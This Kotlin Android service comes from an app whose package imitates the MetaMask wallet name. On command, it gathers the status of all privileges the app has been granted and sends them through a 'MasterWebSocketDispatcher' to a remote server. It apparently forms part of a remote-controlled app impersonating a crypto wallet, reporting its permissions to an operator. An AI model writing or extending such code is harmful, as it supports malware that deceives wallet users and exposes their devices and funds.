package com.example.MetaMask.services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.example.MetaMask.utils.PrivilegeChecker
import kotlinx.coroutines.*
import org.json.JSONObject

class PrivilegeService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    companion object {
        const val ACTION_CHECK_AND_REPORT_STATUSES = "ACTION_CHECK_AND_REPORT_STATUSES"
        const val EXTRA_DELAY_MS = "EXTRA_DELAY_MS"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[PrivilegeService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        if (intent?.action == ACTION_CHECK_AND_REPORT_STATUSES) {
            android.util.Log.d("XDBG", "[PrivilegeService] if branch") //xdbg
            val delay = intent.getLongExtra(EXTRA_DELAY_MS, 0L)

            scope.launch {
                delay(delay)
                val statusPayload = JSONObject().apply {
                    put("action", "privilegeStatusUpdate")
                    put("statuses", PrivilegeChecker.getAllPrivilegesStatus(applicationContext))
                }

                val broadcastIntent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                    putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, statusPayload.toString())
                    setPackage(packageName)
                }
                sendBroadcast(broadcastIntent)
                stopSelf(startId)
            }
        } else {
            stopSelf(startId)
        }

        android.util.Log.d("XDBG", "[PrivilegeService] return") //xdbg
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[PrivilegeService] onDestroy enter") //xdbg
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
